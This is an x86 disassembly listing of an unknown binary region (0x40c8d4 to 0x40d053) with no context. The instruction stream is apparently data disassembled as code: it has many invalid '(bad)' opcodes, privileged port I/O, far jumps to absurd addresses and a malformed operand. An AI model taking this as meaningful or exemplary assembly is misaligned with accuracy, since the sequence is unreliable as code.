  40c8d4:	inc    esp
  40c8d5:	xor    bh,BYTE PTR [edi-0x7a473a3]
  40c8db:	(bad)
  40c8e0:	ins    DWORD PTR es:[edi],dx
  40c8e1:	paddb  mm4,mm5
  40c8e4:	idiv   BYTE PTR [edx+0x2c]
  40c8e7:	fstp   st(2)
  40c8e9:	ins    DWORD PTR es:[edi],dx
  40c8ea:	pop    edx
  40c8eb:	pop    ecx
  40c8ec:	jl     0x40c927
  40c8ee:	mov    DWORD PTR [edx-0x6d704fdb],ebp
  40c8f4:	mov    dh,0xb0
  40c8f6:	ins    DWORD PTR es:[edi],dx
  40c8f7:	ins    BYTE PTR es:[edi],dx
  40c8f8:	imul   ecx,ebx,0xdb950a63
  40c8fe:	xor    BYTE PTR [bx+0x76],al
  40c902:	add    DWORD PTR [edi+0x6b61f8a5],esi
  40c908:	cmp    ecx,DWORD PTR [edi+0x72]
  40c90b:	in     eax,0xef
  40c90d:	fiadd  DWORD PTR [esi]
  40c90f:	push   eax
  40c910:	fadd   DWORD PTR [ecx-0x6d]
  40c913:	sbb    DWORD PTR [esp+eiz*2],ebp
  40c916:	lds    ebp,FWORD PTR [edx]
  40c918:	pop    esp
  40c919:	fcom   DWORD PTR [esi]
  40c91b:	pop    esi
  40c91c:	test   eax,0xd88852f
  40c921:	(bad)
  40c925:	mov    al,0xdd
  40c927:	xchg   edi,eax
  40c928:	push   cs
  40c929:	fdivr  QWORD PTR [edx+0x3e]
  40c92c:	push   ebx
  40c92d:	adc    eax,0xdda1f03e
  40c932:	mov    dh,0xe5
  40c934:	sub    BYTE PTR [eax],al
  40c936:	or     eax,0xfe50bf54
  40c93b:	cmc    
  40c93c:	clc    
  40c93d:	mov    bl,0xeb
  40c93f:	dec    ebx
  40c940:	mov    bh,0x85
  40c942:	ins    DWORD PTR es:[edi],dx
  40c943:	sbb    dh,ah
  40c945:	pusha  
  40c946:	loop   0x40c941
  40c948:	sbb    ah,BYTE PTR [ecx+edi*8]
  40c94b:	jno    0x40c8ce
  40c94d:	ins    BYTE PTR es:[edi],dx
  40c94e:	or     ecx,DWORD PTR [ebx-0x35]
  40c951:	add    BYTE PTR [ebx+0x5ee61165],bl
  40c957:	clc    
  40c958:	ja     0x40c9bd
  40c95a:	retf   
  40c95b:	sbb    eax,0x4aae0bad
  40c960:	gs cmp ch,dl
  40c963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c964:	add    dh,dl
  40c966:	mov    edi,0xbad0b5b
  40c96b:	adc    ebp,DWORD PTR [edi+edx*2]
  40c96e:	mov    al,ds:0xc425b373
  40c973:	mov    dh,0xad
  40c975:	push   es
  40c976:	mov    ch,0x41
  40c978:	imul   esi,ecx,0x70
  40c97b:	in     al,dx
  40c97c:	xor    BYTE PTR [edx-0x25],0x42
  40c980:	imul   eax,DWORD PTR [ebx],0x169296ae
  40c986:	and    edi,DWORD PTR [edi-0x4914a9c7]
  40c98c:	ins    DWORD PTR es:[edi],dx
  40c98d:	mov    ecx,0x81eec5b
  40c992:	or     edx,edi
  40c994:	loop   0x40ca12
  40c996:	mov    edx,0x1ac2c6c4
  40c99b:	(bad)  
  40c99c:	stos   BYTE PTR es:[edi],al
  40c99d:	inc    di
  40c99f:	mov    BYTE PTR [edx-0x16bd17a0],dh
  40c9a5:	push   esi
  40c9a6:	fimul  DWORD PTR [ebp+0x40]
  40c9a9:	xchg   cl,ch
  40c9ab:	jg     0x40c990
  40c9ad:	les    ebx,FWORD PTR [ebp+0x36]
  40c9b0:	sbb    ah,BYTE PTR [eax]
  40c9b2:	in     eax,dx
  40c9b3:	inc    ebp
  40c9b4:	nop
  40c9b5:	cld    
  40c9b6:	xor    esp,DWORD PTR [eax-0x5f4b9600]
  40c9bc:	pop    edi
  40c9bd:	jo     0x40c9b2
  40c9bf:	rol    DWORD PTR [ebp-0x49347a73],1
  40c9c5:	push   esp
  40c9c6:	cmp    al,0x25
  40c9c8:	add    al,0xa1
  40c9ca:	push   0xffffff8a
  40c9cc:	pusha  
  40c9cd:	sti    
  40c9ce:	and    ch,BYTE PTR [edi+0x3983f546]
  40c9d4:	xchg   ecx,eax
  40c9d5:	mov    ?,WORD PTR [esi-0x5d]
  40c9d8:	pop    ebp
  40c9d9:	stos   BYTE PTR es:[edi],al
  40c9da:	out    dx,eax
  40c9db:	scas   al,BYTE PTR es:[edi]
  40c9dc:	mov    WORD PTR [esi+0x57],cs
  40c9df:	es cmp bh,cl
  40c9e2:	push   0xabb52e20
  40c9e7:	gs push esi
  40c9e9:	mov    eax,ds:0x4bf8a021
  40c9ee:	sbb    esp,ebp
  40c9f0:	aaa    
  40c9f1:	mov    edi,0x6b00dd09
  40c9f6:	repz push esp
  40c9f8:	xor    bl,BYTE PTR [eax-0x4927aaab]
  40c9fe:	pop    ebx
  40c9ff:	pop    esi
  40ca00:	pop    es
  40ca01:	popf   
  40ca02:	outs   dx,BYTE PTR ds:[esi]
  40ca03:	cmp    BYTE PTR [edi+ebx*4-0x4b493936],bh
  40ca0a:	mov    al,0x52
  40ca0c:	in     eax,dx
  40ca0d:	push   edx
  40ca0e:	pop    ecx
  40ca0f:	je     0x40c9ed
  40ca11:	stos   BYTE PTR es:[edi],al
  40ca12:	idiv   DWORD PTR [edx+ebx*1]
  40ca15:	pusha  
  40ca16:	jecxz  0x40c9de
  40ca18:	cmp    edi,DWORD PTR [ecx]
  40ca1a:	ins    DWORD PTR es:[edi],dx
  40ca1b:	out    0x6,al
  40ca1d:	out    0x91,eax
  40ca1f:	push   ebp
  40ca20:	ins    DWORD PTR es:[edi],dx
  40ca21:	push   ebx
  40ca22:	jo     0x40c9ff
  40ca24:	pop    edi
  40ca25:	xor    al,bh
  40ca27:	xor    BYTE PTR [ecx],ch
  40ca29:	mov    BYTE PTR [edx-0x569cdcaa],0x21
  40ca30:	mov    BYTE PTR [ebx-0x59f7d5a1],bh
  40ca36:	in     al,0xd8
  40ca38:	cs jl  0x40caaf
  40ca3b:	and    eax,0x5bbd7c22
  40ca40:	push   edx
  40ca41:	sbb    ch,ah
  40ca43:	inc    edx
  40ca44:	push   esi
  40ca45:	mov    edx,0x2bdeae05
  40ca4a:	test   DWORD PTR [edx-0x3d164c9e],eax
  40ca50:	rol    dh,cl
  40ca52:	into   
  40ca53:	dec    eax
  40ca54:	lods   eax,DWORD PTR ds:[esi]
  40ca55:	clc    
  40ca56:	and    DWORD PTR [edi+0x1b],0xffffffa2
  40ca5a:	push   eax
  40ca5b:	(bad)  [esi+0x72f756cb]
  40ca61:	mov    al,0x37
  40ca63:	sub    ebp,esp
  40ca65:	push   esi
  40ca66:	sti    
  40ca67:	clc    
  40ca68:	mov    ebx,0x2842c2e0
  40ca6d:	push   ecx
  40ca6e:	cmp    eax,0xd801129d
  40ca73:	push   eax
  40ca74:	sub    al,0x5f
  40ca76:	push   0x17c6a90b
  40ca7b:	fadd   QWORD PTR [esi]
  40ca7d:	sahf   
  40ca7e:	add    BYTE PTR [esi-0x4897240c],dl
  40ca84:	adc    dh,BYTE PTR ds:0x4dad7420
  40ca8a:	aas    
  40ca8b:	dec    eax
  40ca8c:	mov    edi,0x6d8db42b
  40ca91:	and    BYTE PTR [di],dh
  40ca94:	aas    
  40ca95:	ins    BYTE PTR es:[edi],dx
  40ca96:	jecxz  0x40cadd
  40ca98:	xor    eax,0x42d2c2da
  40ca9d:	mov    ch,0x75
  40ca9f:	cmp    BYTE PTR [esi],bl
  40caa1:	aaa    
  40caa2:	aad    0xce
  40caa4:	mov    al,0x74
  40caa6:	sub    esi,DWORD PTR [edi+ecx*8+0x3411d794]
  40caad:	out    dx,eax
  40caae:	push   0x1d1b4b4b
  40cab3:	jne    0x40ca65
  40cab5:	test   al,0x84
  40cab7:	sub    al,0xe0
  40cab9:	ret    0x5b33
  40cabc:	sbb    ecx,ebx
  40cabe:	outs   dx,DWORD PTR ds:[esi]
  40cabf:	clc    
  40cac0:	es mov ebx,0xd11b5a00
  40cac6:	xchg   ebx,eax
  40cac7:	(bad)  
  40cac8:	sbb    edx,ebx
  40caca:	shr    DWORD PTR [ebp+0x10451b6d],0x26
  40cad1:	or     al,0x53
  40cad3:	mov    ecx,0x2ed30afd
  40cad8:	test   al,0x36
  40cada:	xchg   ebp,eax
  40cadb:	sahf   
  40cadc:	pop    ebx
  40cadd:	enter  0x9351,0x59
  40cae1:	ins    BYTE PTR es:[edi],dx
  40cae2:	or     ebx,DWORD PTR [ebx]
  40cae4:	jmp    0x466a:0x23c730e1
  40caeb:	lock xor al,BYTE PTR [esi]
  40caee:	ret    0x5db6
  40caf1:	sub    dh,BYTE PTR [ebx+0x5f]
  40caf4:	test   eax,0xe0e8b079
  40caf9:	jg     0x40caf2
  40cafb:	fdiv   QWORD PTR [esi-0x9ba7253]
  40cb01:	push   edx
  40cb02:	xchg   edx,eax
  40cb03:	dec    ebp
  40cb04:	sub    BYTE PTR [edx-0x11],ah
  40cb07:	sbb    al,0x85
  40cb09:	jbe    0x40cae6
  40cb0b:	sub    BYTE PTR [edx],ah
  40cb0d:	jmp    0x55a7:0x6d540888
  40cb14:	(bad)  
  40cb15:	inc    esp
  40cb16:	ins    BYTE PTR es:[edi],dx
  40cb17:	fstp   TBYTE PTR ds:0x1a209236
  40cb1d:	fchs   
  40cb1f:	inc    esi
  40cb20:	shr    DWORD PTR [ebp-0x25],1
  40cb23:	outs   dx,BYTE PTR ds:[esi]
  40cb24:	fist   DWORD PTR [eax]
  40cb26:	fisttp QWORD PTR [edx-0x6729bf1a]
  40cb2c:	sub    DWORD PTR [ebx],esp
  40cb2e:	cmp    edx,DWORD PTR [esi+0x4b]
  40cb31:	rol    dl,0x6
  40cb34:	add    bh,BYTE PTR [edx]
  40cb36:	mov    BYTE PTR [eax],dh
  40cb38:	jo     0x40cba0
  40cb3a:	(bad)  
  40cb3b:	ins    DWORD PTR es:[edi],dx
  40cb3c:	pop    ebx
  40cb3d:	push   0xb913c183
  40cb42:	fsub   DWORD PTR [ecx+0x4254acc9]
  40cb48:	fld    TBYTE PTR [esi]
  40cb4a:	mov    eax,0xb499cad7
  40cb4f:	repnz sub al,0x6e
  40cb52:	call   0xdbae86c4
  40cb57:	scas   al,BYTE PTR es:[edi]
  40cb58:	(bad)  
  40cb59:	sub    WORD PTR [ebp-0x6e],di
  40cb5d:	in     al,0x9c
  40cb5f:	jmp    0x6d82fb41
  40cb64:	dec    ebx
  40cb65:	or     ecx,DWORD PTR ds:0x80528c1f
  40cb6b:	sub    eax,0x376b714f
  40cb70:	fidivr DWORD PTR [edi+ebp*1-0x409a2185]
  40cb77:	in     al,dx
  40cb78:	mov    ch,0x44
  40cb7a:	inc    edx
  40cb7b:	mov    ah,0x6d
  40cb7d:	pop    ss
  40cb7e:	sub    ecx,DWORD PTR [edi-0x16]
  40cb81:	mov    esp,0x6b127101
  40cb86:	(bad)  [ebp-0x463fc973]
  40cb8c:	adc    dh,BYTE PTR [ebp+0x7792647a]
  40cb92:	push   ss
  40cb93:	ss mov dh,0x6d
  40cb96:	out    dx,al
  40cb97:	das    
  40cb98:	enter  0xdda,0x39
  40cb9c:	push   ebp
  40cb9d:	les    esp,FWORD PTR [edi+0x36d837cb]
  40cba3:	sbb    DWORD PTR [ebp+0x7795a941],0x26fc0093
  40cbad:	mov    ebx,0xf5b5b1b4
  40cbb2:	and    ecx,DWORD PTR [esi]
  40cbb4:	scas   eax,DWORD PTR es:[edi]
  40cbb5:	iret   
  40cbb6:	popa   
  40cbb7:	or     BYTE PTR ds:0x4bb47142,al
  40cbbd:	fild   DWORD PTR [esi-0x5e]
  40cbc0:	mov    edx,0x8cb3174
  40cbc5:	in     al,dx
  40cbc6:	sbb    ah,BYTE PTR [ebp-0x30912925]
  40cbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbcd:	sbb    eax,0xad37d4b3
  40cbd2:	mov    bh,0xd0
  40cbd4:	cwde   
  40cbd5:	ss push ss
  40cbd7:	mov    dh,0x1b
  40cbd9:	dec    ebx
  40cbda:	xchg   esi,eax
  40cbdb:	mov    al,0x35
  40cbdd:	add    ebp,DWORD PTR [edi+0x36cbc64d]
  40cbe3:	xchg   esi,eax
  40cbe4:	sbb    bl,BYTE PTR [edi]
  40cbe6:	fld    DWORD PTR [esi-0x56]
  40cbe9:	imul   esi,DWORD PTR [esi+0x68032d95],0xa805da17
  40cbf3:	ret    0x8343
  40cbf6:	addr16 loope 0x40cb98
  40cbf9:	xchg   BYTE PTR [ecx+0x61],dh
  40cbfc:	test   eax,0x99830fdd
  40cc01:	inc    esp
  40cc02:	sub    al,0x76
  40cc04:	sar    DWORD PTR [edi],0xf4
  40cc07:	mov    ds:0xa8a16b71,eax
  40cc0c:	dec    ecx
  40cc0d:	arpl   WORD PTR [edi],si
  40cc0f:	retf   0x4b23
  40cc12:	cdq    
  40cc13:	fdiv   DWORD PTR [esi-0xef58f4a]
  40cc19:	adc    edi,DWORD PTR [eax-0x35]
  40cc1c:	sar    DWORD PTR [ebx-0x6b],1
  40cc1f:	xchg   edi,eax
  40cc20:	sub    ebp,DWORD PTR [esi-0x5b]
  40cc23:	pop    eax
  40cc24:	sbb    al,0x86
  40cc26:	jae    0x40cc36
  40cc28:	call   0xb1a1:0x76c4f9d7
  40cc2f:	imul   DWORD PTR [ecx+0x2485071e]
  40cc35:	dec    edx
  40cc36:	les    ebx,FWORD PTR [ebx-0x15]
  40cc39:	ret    0x1f6
  40cc3c:	das    
  40cc3d:	ret    0x7c9e
  40cc40:	fstp   QWORD PTR [eax-0x45689490]
  40cc46:	aam    0xda
  40cc48:	outs   dx,BYTE PTR ds:[esi]
  40cc49:	xlat   BYTE PTR ds:[ebx]
  40cc4a:	push   ss
  40cc4b:	or     BYTE PTR [esi-0x7c],ch
  40cc4e:	push   ss
  40cc4f:	mov    edi,0xb0b04cbc
  40cc54:	mov    al,0xd4
  40cc56:	les    esi,FWORD PTR [ecx-0x41]
  40cc59:	pop    esi
  40cc5a:	lods   al,BYTE PTR ds:[esi]
  40cc5b:	imul   DWORD PTR [edi+0x6]
  40cc5e:	or     dl,BYTE PTR [esi]
  40cc60:	mov    edx,0x599bb91f
  40cc65:	fidiv  DWORD PTR [edi-0x24f4b5ea]
  40cc6b:	add    eax,0xeeb32337
  40cc70:	dec    esi
  40cc71:	and    BYTE PTR [ecx+0x176f966a],ch
  40cc77:	mov    dh,0xd9
  40cc79:	pop    ss
  40cc7a:	mov    ebx,0x368cf199
  40cc7f:	add    BYTE PTR [ebp+0x5c55ad7a],bh
  40cc85:	push   0x22
  40cc87:	fld    QWORD PTR [esi+esi*4]
  40cc8a:	push   eax
  40cc8b:	sbb    bl,0xc6
  40cc8e:	push   esi
  40cc8f:	add    ebx,DWORD PTR [esp]
  40cc92:	pop    eax
  40cc93:	jmp    0x11a5fb67
  40cc98:	fdiv   QWORD PTR [esi-0x191993ba]
  40cc9e:	mov    dh,0xf2
  40cca0:	mov    ds:0x9bf3f065,al
  40cca5:	push   0xea787dbb
  40ccaa:	adc    DWORD PTR [edx+esi*2+0x5342b656],eax
  40ccb1:	stos   DWORD PTR es:[di],eax
  40ccb3:	mov    edx,0x114a6d28
  40ccb8:	fld    QWORD PTR [esi]
  40ccba:	mov    bh,ch
  40ccbc:	test   DWORD PTR [ebp-0x68fe5e8a],eax
  40ccc2:	sbb    edx,DWORD PTR [esi+0x433a340e]
  40ccc8:	stos   DWORD PTR es:[edi],eax
  40ccc9:	sub    eax,0x9c70c2ff
  40ccce:	pop    ds
  40cccf:	ins    BYTE PTR es:[edi],dx
  40ccd0:	add    BYTE PTR [ecx-0x4e],al
  40ccd3:	add    BYTE PTR [ebx-0x52],dl
  40ccd6:	das    
  40ccd7:	clc    
  40ccd8:	add    al,0x5b
  40ccda:	push   0x711f6db7
  40ccdf:	inc    edx
  40cce0:	or     edi,DWORD PTR [ecx+0x610d0e85]
  40cce6:	mov    esp,0x6171b2da
  40cceb:	fnsave [esi-0x45]
  40ccee:	ror    ecx,0x21
  40ccf1:	dec    BYTE PTR [ebp+0x5b]
  40ccf4:	pop    ss
  40ccf5:	fdiv   QWORD PTR [esi]
  40ccf7:	mov    edx,0x4437feae
  40ccfc:	int    0xef
  40ccfe:	lods   eax,DWORD PTR ds:[esi]
  40ccff:	call   esp
  40cd01:	cs xchg ebp,eax
  40cd03:	sbb    eax,DWORD PTR [esp+eax*2-0x27e2dc19]
  40cd0a:	jecxz  0x40ccdc
  40cd0c:	outs   dx,BYTE PTR ds:[esi]
  40cd0d:	in     eax,dx
  40cd0e:	mov    dh,0x8
  40cd10:	not    cl
  40cd12:	ss xor esi,edi
  40cd15:	add    BYTE PTR ds:0x4bfc0838,0xed
  40cd1c:	mov    dh,0xa
  40cd1e:	and    ch,BYTE PTR [edx+0x2f02c510]
  40cd24:	(bad)  
  40cd25:	pop    ecx
  40cd26:	add    BYTE PTR [esi],bl
  40cd28:	repnz add BYTE PTR [esi-0x4726a4a5],cl
  40cd2f:	mov    ah,0xf1
  40cd31:	ins    BYTE PTR es:[edi],dx
  40cd32:	sbb    BYTE PTR ds:0x137edfff,0x4b
  40cd39:	dec    ebx
  40cd3a:	or     ebx,DWORD PTR [esi+eax*4]
  40cd3d:	sbb    cl,BYTE PTR [ecx+edi*4+0x6d969d2d]
  40cd44:	(bad)  [esi]
  40cd46:	enter  0x17c6,0x99
  40cd4a:	pop    esp
  40cd4b:	ins    DWORD PTR es:[edi],dx
  40cd4c:	push   ebx
  40cd4d:	mov    dl,0x16
  40cd4f:	pop    eax
  40cd50:	push   0x57c716b7
  40cd55:	sbb    DWORD PTR [esi+0x4aa3d1b3],edx
  40cd5b:	pop    eax
  40cd5c:	fsubr  DWORD PTR [edx]
  40cd5e:	frstor [eax+edi*8]
  40cd61:	adc    eax,0x67e53d1d
  40cd66:	pusha  
  40cd67:	pop    ebx
  40cd68:	push   ebp
  40cd69:	fdivr  DWORD PTR [edx]
  40cd6b:	pop    ss
  40cd6c:	xor    BYTE PTR [ecx+ebp*2],dl
  40cd6f:	dec    esp
  40cd70:	cmp    eax,0x5b616345
  40cd75:	push   0xffffffa4
  40cd77:	mov    bl,0x89
  40cd79:	or     ebx,esp
  40cd7b:	dec    esp
  40cd7c:	arpl   WORD PTR [ebp+0x36],si
  40cd7f:	retf   0x6176
  40cd82:	inc    eax
  40cd83:	(bad)  
  40cd84:	sub    al,0xea
  40cd86:	sbb    al,BYTE PTR [eax]
  40cd88:	push   ds
  40cd89:	ja     0x40cd18
  40cd8b:	ins    DWORD PTR es:[edi],dx
  40cd8c:	arpl   bx,bx
  40cd8e:	(bad)  
  40cd8f:	and    bl,dl
  40cd91:	test   al,0xd8
  40cd93:	jg     0x40cdb5
  40cd95:	sbb    DWORD PTR [ebx+0x76],ecx
  40cd98:	add    DWORD PTR [edi+0x26d60d85],esi
  40cd9e:	repnz lahf 
  40cda0:	lods   al,BYTE PTR ds:[esi]
  40cda1:	xor    eax,ebx
  40cda3:	out    0xbb,eax
  40cda5:	ins    DWORD PTR es:[edi],dx
  40cda6:	xchg   ecx,eax
  40cda7:	sub    ebx,ebp
  40cda9:	cwde   
  40cdaa:	sub    al,0x17
  40cdac:	mov    dl,0x11
  40cdae:	inc    ecx
  40cdaf:	outs   dx,BYTE PTR ds:[esi]
  40cdb0:	sub    al,0xb4
  40cdb2:	ins    DWORD PTR es:[edi],dx
  40cdb3:	int3   
  40cdb4:	mov    ecx,0x5fb2cb37
  40cdb9:	push   ds
  40cdba:	jo     0x40cd8c
  40cdbc:	fcmovnu st,st(0)
  40cdbe:	ss push ds
  40cdc0:	(bad)  
  40cdc1:	xchg   ecx,eax
  40cdc2:	nop
  40cdc3:	ret    0x39b3
  40cdc6:	add    ebx,edi
  40cdc8:	jno    0x40ce2b
  40cdca:	fcmovu st,st(2)
  40cdcc:	ins    DWORD PTR es:[edi],dx
  40cdcd:	cmp    al,0x14
  40cdcf:	aaa    
  40cdd0:	dec    esi
  40cdd1:	sbb    ch,BYTE PTR [edx+0x2edb920a]
  40cdd7:	or     BYTE PTR [eax+0x48eb0cf9],bh
  40cddd:	mov    dl,BYTE PTR [eax-0x5252253e]
  40cde3:	(bad)  [eax-0x56]
  40cde6:	repz icebp 
  40cde8:	and    eax,0x34e67423
  40cded:	mov    ch,0x62
  40cdef:	imul   esi,DWORD PTR [edi+0x7f404106],0x3e
  40cdf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf7:	sahf   
  40cdf8:	and    DWORD PTR [ebx],ecx
  40cdfa:	ins    DWORD PTR es:[edi],dx
  40cdfb:	ins    DWORD PTR es:[edi],dx
  40cdfc:	sub    eax,0x186150aa
  40ce01:	test   eax,0xdbb1e044
  40ce06:	push   edx
  40ce07:	mov    ebx,0x98a5d16d
  40ce0c:	pushf  
  40ce0d:	fidiv  WORD PTR [ecx+0x50]
  40ce10:	dec    esp
  40ce11:	in     al,dx
  40ce12:	add    dh,BYTE PTR [ecx+0x4b528d0]
  40ce18:	xlat   BYTE PTR ds:[ebx]
  40ce19:	or     BYTE PTR [esi-0x7e],dl
  40ce1c:	mov    bh,0x6d
  40ce1e:	mov    cl,0x7d
  40ce20:	mov    ch,0x5a
  40ce22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce23:	loopne 0x40ce47
  40ce25:	sbb    al,BYTE PTR ds:0xdb0ba463
  40ce2b:	(bad)  
  40ce2c:	mov    dh,0xd7
  40ce2e:	mov    bl,BYTE PTR [ebx+0x1b4b068c]
  40ce34:	and    eax,0x6b5b38e2
  40ce39:	jecxz  0x40ce4d
  40ce3b:	adc    BYTE PTR [eax-0x59200972],al
  40ce41:	ds nop
  40ce43:	ins    DWORD PTR es:[edi],dx
  40ce44:	dec    ebx
  40ce45:	pop    ebx
  40ce46:	pop    ebx
  40ce47:	jg     0x40cea7
  40ce49:	mov    eax,0xbf5983e
  40ce4e:	shr    ch,0xc2
  40ce51:	(bad)  
  40ce52:	mov    dh,0x7a
  40ce54:	inc    ebp
  40ce55:	mov    dh,0xa1
  40ce57:	xor    DWORD PTR [ecx-0x1e],ebx
  40ce5a:	fstp   st(1)
  40ce5c:	mov    ecx,0xb6db5b4b
  40ce61:	inc    edi
  40ce62:	fwait
  40ce63:	sbb    BYTE PTR [edx+esi*8+0x26],al
  40ce67:	add    eax,0xd0208607
  40ce6c:	outs   dx,BYTE PTR ds:[esi]
  40ce6d:	sbb    esi,DWORD PTR [ebp+ebp*2+0x77d25f56]
  40ce74:	std    
  40ce75:	xchg   ebx,eax
  40ce76:	xor    eax,0xad1ae0b0
  40ce7b:	aaa    
  40ce7c:	xchg   ecx,eax
  40ce7d:	jnp    0x40ce5c
  40ce7f:	hlt    
  40ce80:	test   al,0x6c
  40ce82:	push   esp
  40ce83:	mov    eax,0xbd01fb4
  40ce88:	sub    BYTE PTR [ebx+0x2ddbd613],ah
  40ce8e:	fstp   st(2)
  40ce90:	inc    edx
  40ce91:	add    esi,DWORD PTR [ebx-0x68]
  40ce94:	in     al,dx
  40ce95:	pop    esp
  40ce96:	rdmsr  
  40ce98:	mov    BYTE PTR [edi+0x1a2b6dad],dh
  40ce9e:	or     ebp,DWORD PTR [eax]
  40cea0:	sahf   
  40cea1:	rdtsc  
  40cea3:	mov    ah,0x17
  40cea5:	sub    ah,BYTE PTR [ebx-0x6b]
  40cea8:	push   0x80a46b61
  40cead:	retf   
  40ceae:	test   eax,0xb052e43d
  40ceb3:	xchg   ebp,eax
  40ceb4:	lds    edi,FWORD PTR cs:[edx-0x63a6ee8f]
  40cebb:	push   ecx
  40cebc:	push   0x2fa170ab
  40cec1:	jmp    0x40ceb9
  40cec3:	xor    al,0xa9
  40cec5:	test   DWORD PTR [esi+0x61],0xdafdd8a1
  40cecc:	test   BYTE PTR [edi],ah
  40cece:	mov    es,WORD PTR [edx-0x4a]
  40ced1:	shl    dl,cl
  40ced3:	in     eax,dx
  40ced4:	mov    esi,0x8a50b3
  40ced9:	fwait
  40ceda:	sub    eax,0xa04ab319
  40cedf:	push   ss
  40cee0:	dec    ebp
  40cee1:	adc    al,0xdc
  40cee3:	push   0xd25cb89e
  40cee8:	jnp    0x40cf57
  40ceea:	imul   edx,DWORD PTR [eax],0xffffffdb
  40ceed:	fs ds shl bl,0xef
  40cef2:	sub    esi,DWORD PTR [eax-0x25d6a493]
  40cef8:	fistp  QWORD PTR [ecx-0x730750e6]
  40cefe:	xor    eax,0xd6c0b003
  40cf03:	cs jp  0x40cef3
  40cf06:	ficomp DWORD PTR [ebx+ecx*1+0x73]
  40cf0a:	cmp    ebx,edi
  40cf0c:	int    0xd4
  40cf0e:	(bad)  
  40cf0f:	mov    dh,0x64
  40cf11:	and    DWORD PTR [ecx+0x6d],ebx
  40cf14:	enter  0xf024,0x7a
  40cf18:	mov    BYTE PTR [ebp+0x7be98d85],0x61
  40cf1f:	popf   
  40cf20:	clc    
  40cf21:	sbb    al,0x92
  40cf23:	dec    edx
  40cf24:	adc    eax,0xad8dd2db
  40cf29:	imul   DWORD PTR [ebp+eax*2-0x3a]
  40cf2d:	scas   eax,DWORD PTR es:[edi]
  40cf2e:	mov    edi,0xb6aa1db6
  40cf33:	push   esi
  40cf34:	mov    ah,0xcb
  40cf36:	add    BYTE PTR [esi],al
  40cf38:	and    DWORD PTR ds:0x6bc2bdc2,ecx
  40cf3e:	jbe    0x40cfab
  40cf40:	pop    ss
  40cf41:	ss out 0x80,eax
  40cf44:	ins    DWORD PTR es:[edi],dx
  40cf45:	rol    DWORD PTR [edi-0x53839d47],1
  40cf4b:	mov    dh,0x69
  40cf4d:	(bad)  [esi]
  40cf4f:	fiadd  DWORD PTR ds:0x26d5724a
  40cf55:	imul   esi,DWORD PTR [esi+edi*2-0x6b],0xd
  40cf5a:	mov    dh,0xb6
  40cf5c:	jbe    0x40cf96
  40cf5e:	push   edx
  40cf5f:	clc    
  40cf60:	inc    edi
  40cf61:	mov    ah,0x13
  40cf63:	and    al,BYTE PTR [eax-0x7a724923]
  40cf69:	(bad)  
  40cf6a:	xchg   ecx,eax
  40cf6b:	xchg   ecx,eax
  40cf6c:	test   al,0xdc
  40cf6e:	outs   dx,BYTE PTR ds:[esi]
  40cf6f:	daa    
  40cf70:	jge    0x40ceff
  40cf72:	sbb    eax,0xadd475b1
  40cf77:	enter  0x4ea7,0x8c
  40cf7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf7c:	lds    ecx,FWORD PTR [edx+0x7a]
  40cf7f:	(bad)  [esi+0x777eb1b1]
  40cf85:	add    BYTE PTR [edx],dh
  40cf87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf88:	es inc esp
  40cf8a:	and    ecx,DWORD PTR [eax+ebp*1+0x4b1b6e2a]
  40cf91:	and    esp,edi
  40cf93:	dec    eax
  40cf94:	adc    eax,0x696aa2b9
  40cf99:	fcmovnu st,st(0)
  40cf9b:	call   0x36ce2706
  40cfa0:	adc    eax,0x35576b44
  40cfa5:	fisttp DWORD PTR [ebp+0x4282636d]
  40cfab:	outs   dx,BYTE PTR ds:[esi]
  40cfac:	es and eax,0x44f56690
  40cfb2:	ja     0x40d021
  40cfb4:	mov    ebx,0x10f944d1
  40cfb9:	fcom   DWORD PTR [ebx+edx*8]
  40cfbc:	and    BYTE PTR [ecx],al
  40cfbe:	in     al,dx
  40cfbf:	mov    dh,0xd4
  40cfc1:	outs   dx,BYTE PTR ds:[esi]
  40cfc2:	pop    ebx
  40cfc3:	adc    bh,cl
  40cfc5:	push   eax
  40cfc6:	jo     0x40cfed
  40cfc8:	out    0x5f,al
  40cfca:	js     0x40cf76
  40cfcc:	sbb    bl,0xd6
  40cfcf:	ret    0xc72f
  40cfd2:	push   ds
  40cfd3:	mov    dl,0x1d
  40cfd5:	inc    esp
  40cfd6:	lds    esp,FWORD PTR [eax-0x15]
  40cfd9:	stos   BYTE PTR es:[edi],al
  40cfda:	in     eax,dx
  40cfdb:	or     BYTE PTR [ebp+0x296bdc66],bh
  40cfe1:	inc    ebx
  40cfe2:	lds    ebp,FWORD PTR [esi+0x6c]
  40cfe5:	dec    ebx
  40cfe6:	ins    DWORD PTR es:[edi],dx
  40cfe7:	mov    BYTE PTR [ebx-0x2f],ch
  40cfea:	mov    esi,0x638a72ef
  40cfef:	sbb    eax,eax
  40cff1:	rol    dh,cl
  40cff3:	(bad)  
  40cff4:	push   cs
  40cff5:	and    edx,DWORD PTR [ecx-0x34]
  40cff8:	ret    0xac38
  40cffb:	test   DWORD PTR [ebp+0x5363c971],ebp
  40d001:	(bad)  
  40d002:	or     bl,BYTE PTR [ecx-0x45627302]
  40d008:	mov    ch,0x9b
  40d00a:	or     DWORD PTR [ecx],0xe1c650f0
  40d010:	or     esp,DWORD PTR [eax]
  40d012:	imul   edx,DWORD PTR [ecx+0x55bb6db6],0xdf8ebb1a
  40d01c:	push   cs
  40d01d:	xor    al,0xbc
  40d01f:	rol    DWORD PTR [ebx+ecx*8-0x4c],0xc1
  40d024:	push   edx
  40d025:	fcmovnbe st,st(7)
  40d027:	jmp    0x38feb0f
  40d02c:	stc    
  40d02d:	(bad)  [esi-0x1e674b4f]
  40d033:	gs xchg ebp,eax
  40d035:	sbb    edx,DWORD PTR [edi]
  40d037:	bound  esp,QWORD PTR [ebx-0x11]
  40d03a:	sub    bl,ch
  40d03c:	or     al,0x1b
  40d03e:	pop    ebx
  40d03f:	(bad)  
  40d040:	into   
  40d041:	inc    edx
  40d042:	jns    0x40cfcf
  40d044:	gs ret 
  40d046:	mov    al,ds:0xadad8db6
  40d04b:	mov    DWORD PTR [ecx-0x62],ebx
  40d04e:	or     eax,0x7d94000b
  40d053:	cmp    eax,0x96175a16
